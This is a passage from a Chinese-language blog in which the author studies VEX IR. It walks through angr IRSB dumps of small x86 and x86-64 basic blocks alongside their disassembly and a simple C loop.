<p>[^115]: Hiromoto, R.E.; Haney, M.; Vakanski, A. A secure architecture for IoT with supply chain risk management. In Proceedings of the 9th IEEE International Conference on Intelligent Data Acquisition and Advanced Computing Systems: Technology and Applications (IDAACS), Bucharest, Romania, 21–23 September 2017.</p>
]]></content>
      <tags>
        <tag>论文翻译</tag>
      </tags>
  </entry>
  <entry>
    <title>VEX IR学习</title>
    <url>/52443.html</url>
    <content><![CDATA[<p>2023-02-Update：很早之前想要重新整理一下来着，一直鸽着。希望今年五月份可以完成orz</p>
<p>搞这个的原因是课题那边，把基本块转成VEX IR后需要进行一些modify。老师：你这周就先把VEX IR （和LLVM IR ）看懂</p>
<p>所以这篇的要求也就是能看懂和在变量名之类的做一点优化（统一）就行了</p>
<span id="more"></span>
<h2 id="代码1">代码1</h2>
<p>从程序里转了一段中间代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IRSB &#123;</span><br><span class="line">   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I32 t4:Ity_I32 t5:Ity_I32 t6:Ity_I32 t7:Ity_I32 t8:Ity_I32 t9:Ity_I32 t10:Ity_I32 t11:Ity_I32 t12:Ity_I32 t13:Ity_I32 t14:Ity_I32 t15:Ity_I32 t16:Ity_I32 t17:Ity_I32 t18:Ity_I32 t19:Ity_I32 t20:Ity_I32 t21:Ity_I32 t22:Ity_I32 t23:Ity_I32 t24:Ity_I32 t25:Ity_I32 t26:Ity_I32 t27:Ity_I32</span><br><span class="line"></span><br><span class="line">   00 | ------ IMark(0x80491b0, 1, 0) ------</span><br><span class="line">   01 | t0 = GET:I32(ebp)</span><br><span class="line">   02 | t13 = GET:I32(esp)</span><br><span class="line">   03 | t12 = Sub32(t13,0x00000004)</span><br><span class="line">   04 | PUT(esp) = t12</span><br><span class="line">   05 | STle(t12) = t0</span><br><span class="line">   06 | ------ IMark(0x80491b1, 2, 0) ------</span><br><span class="line">   07 | PUT(ebp) = t12</span><br><span class="line">   08 | ------ IMark(0x80491b3, 3, 0) ------</span><br><span class="line">   09 | t2 = Sub32(t12,0x00000018)</span><br><span class="line">   10 | PUT(cc_op) = 0x00000006</span><br><span class="line">   11 | PUT(cc_dep1) = t12</span><br><span class="line">   12 | PUT(cc_dep2) = 0x00000018</span><br><span class="line">   13 | PUT(cc_ndep) = 0x00000000</span><br><span class="line">   14 | PUT(esp) = t2</span><br><span class="line">   15 | PUT(eip) = 0x080491b6</span><br><span class="line">   16 | ------ IMark(0x80491b6, 7, 0) ------</span><br><span class="line">   17 | t15 = Add32(t12,0xfffffffc)</span><br><span class="line">   18 | STle(t15) = 0x00000000</span><br><span class="line">   19 | PUT(eip) = 0x080491bd</span><br><span class="line">   20 | ------ IMark(0x80491bd, 7, 0) ------</span><br><span class="line">   21 | t17 = Add32(t12,0xfffffff8)</span><br><span class="line">   22 | STle(t17) = 0x00000000</span><br><span class="line">   23 | ------ IMark(0x80491c4, 6, 0) ------</span><br><span class="line">   24 | PUT(eip) = 0x080491ca</span><br><span class="line">   25 | ------ IMark(0x80491ca, 3, 0) ------</span><br><span class="line">   26 | STle(t2) = 0x0804a021</span><br><span class="line">   27 | ------ IMark(0x80491cd, 3, 0) ------</span><br><span class="line">   28 | t20 = Add32(t12,0xfffffff8)</span><br><span class="line">   29 | PUT(eax) = t20</span><br><span class="line">   30 | PUT(eip) = 0x080491d0</span><br><span class="line">   31 | ------ IMark(0x80491d0, 4, 0) ------</span><br><span class="line">   32 | t22 = Add32(t2,0x00000004)</span><br><span class="line">   33 | STle(t22) = t20</span><br><span class="line">   34 | PUT(eip) = 0x080491d4</span><br><span class="line">   35 | ------ IMark(0x80491d4, 5, 0) ------</span><br><span class="line">   36 | t25 = Sub32(t2,0x00000004)</span><br><span class="line">   37 | PUT(esp) = t25</span><br><span class="line">   38 | STle(t25) = 0x080491d9</span><br><span class="line">   NEXT: PUT(eip) = 0x08049060; Ijk_Call</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>angr输出的反编译代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; irsb.pp()</span><br><span class="line">0x80491b0:	push	ebp</span><br><span class="line">0x80491b1:	mov	ebp, esp</span><br><span class="line">0x80491b3:	sub	esp, 0x18</span><br><span class="line">0x80491b6:	mov	dword ptr [ebp - 4], 0</span><br><span class="line">0x80491bd:	mov	dword ptr [ebp - 8], 0</span><br><span class="line">0x80491c4:	lea	eax, [0x804a021]</span><br><span class="line">0x80491ca:	mov	dword ptr [esp], eax</span><br><span class="line">0x80491cd:	lea	eax, [ebp - 8]</span><br><span class="line">0x80491d0:	mov	dword ptr [esp + 4], eax</span><br><span class="line">0x80491d4:	call	0x8049060</span><br></pre></td></tr></table></figure>
<p>对应ida中选中的部分：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210428124520.png" alt="20210428124520"></p>
<h3 id="分析1">分析1</h3>
<p>首先第一行表示函数的开始（IRSB在此处无意义）<br>
IRSB:</p>
<p>后续的一堆tx:Ity blabla 代表临时变量，同时指明了变量类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">quote:Temporary variables. VEX uses temporary variables as internal registers.</span><br><span class="line">These temporaries are strongly typed (i.e., &quot;64-bit integer&quot; or &quot;32-bit float&quot;).</span><br></pre></td></tr></table></figure>
<p>IMark没有实际意义，仅作为一个statement，括号中的内容分别代表了在程序中的起始地址、指令长度和（不知道，不过只见过值=0）</p>
<p>对寄存器操作前需要读取该寄存器[GET]<br>
操作结束后将值写回[PUT]</p>
<p>t0 = GET:I32(ebp)：t0 gets ebp, which is a 32bit integer</p>
<p>t12 = Sub32(t13,0x00000004): t12 = t13 - 0x4</p>
<p>PUT(esp) = t12: esp = t12<br>
   [Update a register with the value of the given IR Expression.]</p>
<p>STle(t12) = t0: [t12] = t0<br>
  Update a location in memory, “le” in STle (and LDle) stands for “little-endian”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0~7行大概干了个</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br></pre></td></tr></table></figure>
<p>09行的命令很直白，但10~15指的是啥呢…似乎跟10~13出现的&quot;cc_*&quot;有挺大关系，但“cc_”只出现在arm架构的文档中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># NOTE 2: Something is goofy w/r/t archinfo and VEX; cc_op3 is used in ccalls, but there&#x27;s</span><br><span class="line"># no cc_op3 in archinfo, angr itself uses cc_depn instead.  We do the same.</span><br></pre></td></tr></table></figure>
<p>17~22对应了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     [ebp-4], 0</span><br><span class="line">mov     [ebp-4], 0</span><br></pre></td></tr></table></figure>
<p>t15=t12+0xfffffffc，此时t12=ebp。看起来很奇怪，但其实把t15指向了ebp-4的位置，（不过为啥不用减法了？…）</p>
<p>24~26行实现了两条语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x80491c4:	lea	eax, [0x804a021]</span><br><span class="line">0x80491ca:	mov	dword ptr [esp], eax</span><br></pre></td></tr></table></figure>
<p>24行：没有实际意义<br>
26行：<br>
此时t2=esp，把esp指向的值改为0x0804a021d<br>
相当于mov [esp],[0x804a021]<br>
所以其实是再进行了优化的（可能这就是RISC吧…)</p>
<p>28~34:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x80491cd:	lea	eax, [ebp - 8]</span><br><span class="line">0x80491d0:	mov	dword ptr [esp + 4], eax</span><br></pre></td></tr></table></figure>
<p>但并没有像上面一样绕过eax，直接对内存的进行修改，应该是因为针对一个基本块分析的时候要保存寄存器最后的值，不能再优化了</p>
<p>最后的跳转：<br>
放一个官方对于跳转命令的整理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef</span><br><span class="line">   enum &#123;</span><br><span class="line">      Ijk_INVALID=0x1A00, </span><br><span class="line">      Ijk_Boring,         /* not interesting; just goto next */</span><br><span class="line">      Ijk_Call,           /* guest is doing a call */</span><br><span class="line">      Ijk_Ret,            /* guest is doing a return */</span><br><span class="line">      Ijk_ClientReq,      /* do guest client req before continuing */</span><br><span class="line">      Ijk_Yield,          /* client is yielding to thread scheduler */</span><br><span class="line">      Ijk_EmWarn,         /* report emulation warning before continuing */</span><br><span class="line">      Ijk_EmFail,         /* emulation critical (FATAL) error; give up */</span><br><span class="line">      Ijk_NoDecode,       /* current instruction cannot be decoded */</span><br><span class="line">      Ijk_MapFail,        /* Vex-provided address translation failed */</span><br><span class="line">      Ijk_InvalICache,    /* Inval icache for range [CMSTART, +CMLEN) */</span><br><span class="line">      Ijk_FlushDCache,    /* Flush dcache for range [CMSTART, +CMLEN) */</span><br><span class="line">      Ijk_NoRedir,        /* Jump to un-redirected guest addr */</span><br><span class="line">      Ijk_SigILL,         /* current instruction synths SIGILL */</span><br><span class="line">      Ijk_SigTRAP,        /* current instruction synths SIGTRAP */</span><br><span class="line">      Ijk_SigSEGV,        /* current instruction synths SIGSEGV */</span><br><span class="line">      Ijk_SigBUS,         /* current instruction synths SIGBUS */</span><br><span class="line">      Ijk_SigFPE,         /* current instruction synths generic SIGFPE */</span><br><span class="line">      Ijk_SigFPE_IntDiv,  /* current instruction synths SIGFPE - IntDiv */</span><br><span class="line">      Ijk_SigFPE_IntOvf,  /* current instruction synths SIGFPE - IntOvf */</span><br><span class="line">      Ijk_Privileged,     /* current instruction should fail depending on privilege level */</span><br><span class="line">      /* Unfortunately, various guest-dependent syscall kinds.  They</span><br><span class="line">	 all mean: do a syscall before continuing. */</span><br><span class="line">      Ijk_Sys_syscall,    /* amd64/x86 &#x27;syscall&#x27;, ppc &#x27;sc&#x27;, arm &#x27;svc #0&#x27; */</span><br><span class="line">      Ijk_Sys_int32,      /* amd64/x86 &#x27;int $0x20&#x27; */</span><br><span class="line">      Ijk_Sys_int128,     /* amd64/x86 &#x27;int $0x80&#x27; */</span><br><span class="line">      Ijk_Sys_int129,     /* amd64/x86 &#x27;int $0x81&#x27; */</span><br><span class="line">      Ijk_Sys_int130,     /* amd64/x86 &#x27;int $0x82&#x27; */</span><br><span class="line">      Ijk_Sys_int145,     /* amd64/x86 &#x27;int $0x91&#x27; */</span><br><span class="line">      Ijk_Sys_int210,     /* amd64/x86 &#x27;int $0xD2&#x27; */</span><br><span class="line">      Ijk_Sys_sysenter    /* x86 &#x27;sysenter&#x27;.  guest_EIP becomes </span><br><span class="line">                             invalid at the point this happens. */</span><br><span class="line">   &#125;</span><br><span class="line">   IRJumpKind;</span><br></pre></td></tr></table></figure>
<h2 id="代码2">代码2</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IRSB &#123;</span><br><span class="line">   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I32 t4:Ity_I32 t5:Ity_I32 t6:Ity_I1 t7:Ity_I32 t8:Ity_I32 t9:Ity_I32 t10:Ity_I32 t11:Ity_I32 t12:Ity_I32 t13:Ity_I32 t14:Ity_I1 t15:Ity_I1</span><br><span class="line"></span><br><span class="line">   00 | ------ IMark(0x80491fd, 4, 0) ------</span><br><span class="line">   01 | t5 = GET:I32(ebp)</span><br><span class="line">   02 | t4 = Add32(t5,0xfffffff8)</span><br><span class="line">   03 | t2 = LDle:I32(t4)</span><br><span class="line">   04 | PUT(cc_op) = 0x00000006</span><br><span class="line">   05 | PUT(cc_dep1) = t2</span><br><span class="line">   06 | PUT(cc_dep2) = 0x0000000a</span><br><span class="line">   07 | PUT(cc_ndep) = 0x00000000</span><br><span class="line">   08 | PUT(eip) = 0x08049201</span><br><span class="line">   09 | ------ IMark(0x8049201, 6, 0) ------</span><br><span class="line">   10 | t14 = CmpEQ32(t2,0x0000000a)</span><br><span class="line">   11 | t13 = 1Uto32(t14)</span><br><span class="line">   12 | t11 = t13</span><br><span class="line">   13 | t15 = 32to1(t11)</span><br><span class="line">   14 | t6 = t15</span><br><span class="line">   15 | if (t6) &#123; PUT(eip) = 0x8049207; Ijk_Boring &#125;</span><br><span class="line">   NEXT: PUT(eip) = 0x08049221; Ijk_Boring</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x80491fd:	cmp	dword ptr [ebp - 8], 0xa</span><br><span class="line">0x8049201:	jne	0x8049221</span><br></pre></td></tr></table></figure>
<p>suprise…汇编好简洁</p>
<p>03行：t2=[t4]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDle：The value stored at a memory address, with the address specified by another IR Expression.</span><br></pre></td></tr></table></figure>
<p>11行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Iop_1Uto32, /* :: Ity_Bit -&gt; Ity_I32, unsigned widen */</span><br></pre></td></tr></table></figure>
<p>看一下寄存器的定义，t14的大小也是一个bit<br>
所以这个命令的作用就是把它扩展成32位的无符号数，放到t13里</p>
<p>13行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Iop_32to1,  /* :: Ity_I32 -&gt; Ity_Bit, just select bit[0] */</span><br></pre></td></tr></table></figure>
<p>再取最低位放到t15里</p>
<p>讲真没看懂这波操作为啥要这么多次转换</p>
<h2 id="分析3-来波大的">分析3_来波大的</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; irsb.vex.pp()</span><br><span class="line">IRSB &#123;</span><br><span class="line">   t0:Ity_I64 t1:Ity_I32 t2:Ity_I32 t3:Ity_I32 t4:Ity_I64 t5:Ity_I64 t6:Ity_I32 t7:Ity_I32 t8:Ity_I32 t9:Ity_I64 t10:Ity_I64 t11:Ity_I64 t12:Ity_I64 t13:Ity_I64 t14:Ity_I64 t15:Ity_I64 t16:Ity_I64 t17:Ity_I64 t18:Ity_I128 t19:Ity_I128 t20:Ity_I64 t21:Ity_I64 t22:Ity_I32 t23:Ity_I32 t24:Ity_I32 t25:Ity_I64 t26:Ity_I64 t27:Ity_I64 t28:Ity_I64 t29:Ity_I32 t30:Ity_I32 t31:Ity_I64 t32:Ity_I64 t33:Ity_I64 t34:Ity_I64 t35:Ity_I64 t36:Ity_I32 t37:Ity_I64 t38:Ity_I64 t39:Ity_I64 t40:Ity_I64 t41:Ity_I64 t42:Ity_I64 t43:Ity_I64 t44:Ity_I32 t45:Ity_I64 t46:Ity_I64 t47:Ity_I64 t48:Ity_I32 t49:Ity_I64 t50:Ity_I64 t51:Ity_I64 t52:Ity_I64 t53:Ity_I64 t54:Ity_I32 t55:Ity_I64 t56:Ity_I64 t57:Ity_I64 t58:Ity_I64 t59:Ity_I64 t60:Ity_I64 t61:Ity_I64 t62:Ity_I64 t63:Ity_I64 t64:Ity_I32 t65:Ity_I64 t66:Ity_I64 t67:Ity_I64 t68:Ity_I64 t69:Ity_I64 t70:Ity_I64 t71:Ity_I64 t72:Ity_I32 t73:Ity_I64 t74:Ity_I64 t75:Ity_I64 t76:Ity_I64 t77:Ity_I64 t78:Ity_I64 t79:Ity_I32 t80:Ity_I64 t81:Ity_I64 t82:Ity_I64 t83:Ity_I64 t84:Ity_I128 t85:Ity_I64 t86:Ity_I64 t87:Ity_I64 t88:Ity_I64 t89:Ity_I64 t90:Ity_I64 t91:Ity_I64 t92:Ity_I64 t93:Ity_I64 t94:Ity_I64 t95:Ity_I32 t96:Ity_I32 t97:Ity_I64 t98:Ity_I64 t99:Ity_I64 t100:Ity_I64 t101:Ity_I64 t102:Ity_I64 t103:Ity_I32 t104:Ity_I64 t105:Ity_I64 t106:Ity_I1</span><br><span class="line"></span><br><span class="line">   00 | ------ IMark(0x401163, 3, 0) ------</span><br><span class="line">   01 | t27 = GET:I64(rbp)</span><br><span class="line">   02 | t26 = Add64(t27,0xffffffffffffffd4)</span><br><span class="line">   03 | t29 = LDle:I32(t26)</span><br><span class="line">   04 | t28 = 32Uto64(t29)</span><br><span class="line">   05 | ------ IMark(0x401166, 3, 0) ------</span><br><span class="line">   06 | t30 = 64to32(t28)</span><br><span class="line">   07 | t1 = Add32(t30,0x00000001)</span><br><span class="line">   08 | t34 = 32Uto64(t1)</span><br><span class="line">   09 | ------ IMark(0x401169, 3, 0) ------</span><br><span class="line">   10 | t36 = 64to32(t34)</span><br><span class="line">   11 | t35 = 32Sto64(t36)</span><br><span class="line">   12 | PUT(rip) = 0x000000000040116c</span><br><span class="line">   13 | ------ IMark(0x40116c, 4, 0) ------</span><br><span class="line">   14 | t40 = Shl64(t35,0x02)</span><br><span class="line">   15 | t39 = Add64(t27,t40)</span><br><span class="line">   16 | t38 = Add64(t39,0xffffffffffffffe0)</span><br><span class="line">   17 | t44 = LDle:I32(t38)</span><br><span class="line">   18 | t43 = 32Uto64(t44)</span><br><span class="line">   19 | PUT(rip) = 0x0000000000401170</span><br><span class="line">   20 | ------ IMark(0x401170, 4, 0) ------</span><br><span class="line">   21 | t45 = Add64(t27,0xffffffffffffffd4)</span><br><span class="line">   22 | t48 = LDle:I32(t45)</span><br><span class="line">   23 | t47 = 32Sto64(t48)</span><br><span class="line">   24 | PUT(rip) = 0x0000000000401174</span><br><span class="line">   25 | ------ IMark(0x401174, 4, 0) ------</span><br><span class="line">   26 | t51 = Shl64(t47,0x02)</span><br><span class="line">   27 | t50 = Add64(t27,t51)</span><br><span class="line">   28 | t49 = Add64(t50,0xffffffffffffffe0)</span><br><span class="line">   29 | t54 = 64to32(t43)</span><br><span class="line">   30 | t7 = LDle:I32(t49)</span><br><span class="line">   31 | t6 = Add32(t54,t7)</span><br><span class="line">   32 | t58 = 32Uto64(t6)</span><br><span class="line">   33 | PUT(rip) = 0x0000000000401178</span><br><span class="line">   34 | ------ IMark(0x401178, 4, 0) ------</span><br><span class="line">   35 | t61 = Shl64(t47,0x02)</span><br><span class="line">   36 | t60 = Add64(t27,t61)</span><br><span class="line">   37 | t59 = Add64(t60,0xffffffffffffffe0)</span><br><span class="line">   38 | t64 = 64to32(t58)</span><br><span class="line">   39 | STle(t59) = t64</span><br><span class="line">   40 | PUT(rip) = 0x000000000040117c</span><br><span class="line">   41 | ------ IMark(0x40117c, 4, 0) ------</span><br><span class="line">   42 | t66 = Add64(t27,0xffffffffffffffd8)</span><br><span class="line">   43 | t68 = LDle:I64(t66)</span><br><span class="line">   44 | PUT(rip) = 0x0000000000401180</span><br><span class="line">   45 | ------ IMark(0x401180, 4, 0) ------</span><br><span class="line">   46 | t69 = Add64(t27,0xffffffffffffffd4)</span><br><span class="line">   47 | t72 = LDle:I32(t69)</span><br><span class="line">   48 | t71 = 32Sto64(t72)</span><br><span class="line">   49 | PUT(rip) = 0x0000000000401184</span><br><span class="line">   50 | ------ IMark(0x401184, 5, 0) ------</span><br><span class="line">   51 | t75 = Shl64(t71,0x02)</span><br><span class="line">   52 | t74 = Add64(t27,t75)</span><br><span class="line">   53 | t73 = Add64(t74,0xffffffffffffffe0)</span><br><span class="line">   54 | t79 = LDle:I32(t73)</span><br><span class="line">   55 | t78 = 32Sto64(t79)</span><br><span class="line">   56 | ------ IMark(0x401189, 4, 0) ------</span><br><span class="line">   57 | t16 = Mul64(t78,t68)</span><br><span class="line">   58 | ------ IMark(0x40118d, 3, 0) ------</span><br><span class="line">   59 | ------ IMark(0x401190, 2, 0) ------</span><br><span class="line">   60 | t81 = Sar64(t16,0x3f)</span><br><span class="line">   61 | ------ IMark(0x401192, 5, 0) ------</span><br><span class="line">   62 | PUT(rcx) = 0x0000000000000002</span><br><span class="line">   63 | ------ IMark(0x401197, 3, 0) ------</span><br><span class="line">   64 | t84 = 64HLto128(t81,t16)</span><br><span class="line">   65 | t106 = CmpEQ64(0x0000000000000002,0x0000000000000000)</span><br><span class="line">   66 | if (t106) &#123; PUT(rip) = 0x401197; Ijk_SigFPE_IntDiv &#125;</span><br><span class="line">   67 | t19 = DivModS128to64(t84,0x0000000000000002)</span><br><span class="line">   68 | t88 = 128HIto64(t19)</span><br><span class="line">   69 | PUT(rdx) = t88</span><br><span class="line">   70 | PUT(rip) = 0x000000000040119a</span><br><span class="line">   71 | ------ IMark(0x40119a, 4, 0) ------</span><br><span class="line">   72 | t89 = Add64(t27,0xffffffffffffffd8)</span><br><span class="line">   73 | STle(t89) = t88</span><br><span class="line">   74 | PUT(rip) = 0x000000000040119e</span><br><span class="line">   75 | ------ IMark(0x40119e, 3, 0) ------</span><br><span class="line">   76 | t92 = Add64(t27,0xffffffffffffffd4)</span><br><span class="line">   77 | t95 = LDle:I32(t92)</span><br><span class="line">   78 | t94 = 32Uto64(t95)</span><br><span class="line">   79 | ------ IMark(0x4011a1, 3, 0) ------</span><br><span class="line">   80 | t96 = 64to32(t94)</span><br><span class="line">   81 | t22 = Add32(t96,0x00000001)</span><br><span class="line">   82 | PUT(cc_op) = 0x0000000000000003</span><br><span class="line">   83 | t98 = 32Uto64(t96)</span><br><span class="line">   84 | PUT(cc_dep1) = t98</span><br><span class="line">   85 | PUT(cc_dep2) = 0x0000000000000001</span><br><span class="line">   86 | t100 = 32Uto64(t22)</span><br><span class="line">   87 | PUT(rax) = t100</span><br><span class="line">   88 | PUT(rip) = 0x00000000004011a4</span><br><span class="line">   89 | ------ IMark(0x4011a4, 3, 0) ------</span><br><span class="line">   90 | t101 = Add64(t27,0xffffffffffffffd4)</span><br><span class="line">   91 | t103 = 64to32(t100)</span><br><span class="line">   92 | STle(t101) = t103</span><br><span class="line">   93 | ------ IMark(0x4011a7, 5, 0) ------</span><br><span class="line">   NEXT: PUT(rip) = 0x0000000000401159; Ijk_Boring</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>angr的汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; irsb.pp()</span><br><span class="line">0x401163:	mov	eax, dword ptr [rbp - 0x2c]</span><br><span class="line">0x401166:	add	eax, 1</span><br><span class="line">0x401169:	movsxd	rcx, eax</span><br><span class="line">0x40116c:	mov	eax, dword ptr [rbp + rcx*4 - 0x20]</span><br><span class="line">0x401170:	movsxd	rcx, dword ptr [rbp - 0x2c]</span><br><span class="line">0x401174:	add	eax, dword ptr [rbp + rcx*4 - 0x20]</span><br><span class="line">0x401178:	mov	dword ptr [rbp + rcx*4 - 0x20], eax</span><br><span class="line">0x40117c:	mov	rcx, qword ptr [rbp - 0x28]</span><br><span class="line">0x401180:	movsxd	rdx, dword ptr [rbp - 0x2c]</span><br><span class="line">0x401184:	movsxd	rdx, dword ptr [rbp + rdx*4 - 0x20]</span><br><span class="line">0x401189:	imul	rcx, rdx</span><br><span class="line">0x40118d:	mov	rax, rcx</span><br><span class="line">0x401190:	cqo	</span><br><span class="line">0x401192:	mov	ecx, 2</span><br><span class="line">0x401197:	idiv	rcx</span><br><span class="line">0x40119a:	mov	qword ptr [rbp - 0x28], rdx</span><br><span class="line">0x40119e:	mov	eax, dword ptr [rbp - 0x2c]</span><br><span class="line">0x4011a1:	add	eax, 1</span><br><span class="line">0x4011a4:	mov	dword ptr [rbp - 0x2c], eax</span><br><span class="line">0x4011a7:	jmp	0x401159</span><br></pre></td></tr></table></figure>
<p>这段代码是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> j=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">	a[i]+=a[i+<span class="number">1</span>];</span><br><span class="line">	j=j*a[i]%<span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>的循环部分</p>
<p>01~04：执行后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">t26=rbp-0x2c</span><br><span class="line">t29=dowrd ptr [rbp-0x2c]=eax</span><br><span class="line">t28=eax(64bits)</span><br></pre></td></tr></table></figure>
<p>结合下一步的操作，不是很懂意义何在…</p>
<p>11行：出现了vex ir 指令，Sto，S指的是singed widen；类似的Uto中，U指的是unsigned widen<br>
对于这行代码的理解可以参考汇编中的movsxd：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> MOVSXD r64, r/m32       Move doubleword to quadword with sign-extension.</span><br><span class="line">这是64位代码的指令，该指令将32位寄存器或地址转换为32位值，并将其符号扩展为64位寄存器。符号扩展是获取源的最高位（符号位）的值，并使用它来填充目标的所有高位。</span><br></pre></td></tr></table></figure>
<p>到57行前都是些重复的语句</p>
<p>57行：<br>
mul64：官方文档中写道，mul代表的是signless的，相对的有以下乘法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">      /* -- Ordering not important after here. -- */</span><br><span class="line">      ...</span><br><span class="line">      /* Widening multiplies */</span><br><span class="line">      Iop_MullS8, Iop_MullS16, Iop_MullS32, Iop_MullS64,</span><br><span class="line">      Iop_MullU8, Iop_MullU16, Iop_MullU32, Iop_MullU64,</span><br><span class="line"></span><br><span class="line">(看上去和arm的精简指令集挺像的)</span><br></pre></td></tr></table></figure>
<p>看到这行产生了个疑惑：imul是带符号的，但mul64是个无符号的乘法<br>
再往下看看，发现，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">t16=Mul64(t78,t68)</span><br><span class="line">t81=Sar64(t16,0x3f)</span><br></pre></td></tr></table></figure>
<p>完成了以下三条汇编指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x401189:	imul	rcx, rdx</span><br><span class="line">0x40118d:	mov	rax, rcx</span><br><span class="line">0x401190:	cqo	</span><br></pre></td></tr></table></figure>
<p>sar64：官方文档中没有描述作用，猜测和x64汇编相似，即算术右移（用符号位补）<br>
cqo：将rax中的符号复制到rdx的每个位上</p>
<p>64~70行：<br>
简单的一条</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">idiv rcx</span><br></pre></td></tr></table></figure>
<p>被转换成了七行ir</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">64 | t84 = 64HLto128(t81,t16)</span><br><span class="line">65 | t106 = CmpEQ64(0x0000000000000002,0x0000000000000000)</span><br><span class="line">66 | if (t106) &#123; PUT(rip) = 0x401197; Ijk_SigFPE_IntDiv &#125;</span><br><span class="line">67 | t19 = DivModS128to64(t84,0x0000000000000002)</span><br><span class="line">68 | t88 = 128HIto64(t19)</span><br><span class="line">69 | PUT(rdx) = t88</span><br><span class="line">70 | PUT(rip) = 0x000000000040119a</span><br></pre></td></tr></table></figure>
<p>涉及到了几个没有见过的VEX IR 指令：<br>
64HLto128：两个64位的寄存器里的值组合扩展到128位的寄存器中<br>
DivModS128to64：:: V128,I64 -&gt; V128，of which lo half is div and hi half is mod<br>
128HIto64：128位数据中的高64位复制到64位寄存器中</p>
<p>82~85行，出现了“cc_*”的“寄存器”，但似乎对理解这个基本块的VEX IR完全没有影响…（不会是因为代码片段还不够长吧orz）</p>
<h3 id="第二段">第二段</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; irsb.vex.pp()</span><br><span class="line">IRSB &#123;</span><br><span class="line">   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I64 t4:Ity_I64 t5:Ity_I64 t6:Ity_I64 t7:Ity_I64 t8:Ity_I1 t9:Ity_I64 t10:Ity_I64 t11:Ity_I64 t12:Ity_I64 t13:Ity_I64 t14:Ity_I64 t15:Ity_I64 t16:Ity_I64 t17:Ity_I1 t18:Ity_I32 t19:Ity_I32 t20:Ity_I1</span><br><span class="line"></span><br><span class="line">   00 | ------ IMark(0x401159, 4, 0) ------</span><br><span class="line">   01 | t5 = GET:I64(rbp)</span><br><span class="line">   02 | t4 = Add64(t5,0xffffffffffffffd4)</span><br><span class="line">   03 | t2 = LDle:I32(t4)</span><br><span class="line">   04 | PUT(cc_op) = 0x0000000000000007</span><br><span class="line">   05 | t15 = 32Uto64(t2)</span><br><span class="line">   06 | t6 = t15</span><br><span class="line">   07 | PUT(cc_dep1) = t6</span><br><span class="line">   08 | PUT(cc_dep2) = 0x0000000000000003</span><br><span class="line">   09 | PUT(rip) = 0x000000000040115d</span><br><span class="line">   10 | ------ IMark(0x40115d, 6, 0) ------</span><br><span class="line">   11 | t18 = 64to32(0x0000000000000003)</span><br><span class="line">   12 | t19 = 64to32(t6)</span><br><span class="line">   13 | t17 = CmpLT32S(t19,t18)</span><br><span class="line">   14 | t16 = 1Uto64(t17)</span><br><span class="line">   15 | t13 = t16</span><br><span class="line">   16 | t20 = 64to1(t13)</span><br><span class="line">   17 | t8 = t20</span><br><span class="line">   18 | if (t8) &#123; PUT(rip) = 0x401163; Ijk_Boring &#125;</span><br><span class="line">   NEXT: PUT(rip) = 0x00000000004011ac; Ijk_Boring</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">反汇编结果：</span><br><span class="line">```asm</span><br><span class="line">0x401159:	cmp	dword ptr [rbp - 0x2c], 3</span><br><span class="line">0x40115d:	jge	0x4011ac</span><br></pre></td></tr></table></figure>
<p>第一部分13行：cmpLT32S<br>
官方文档中的解释很短：</p>
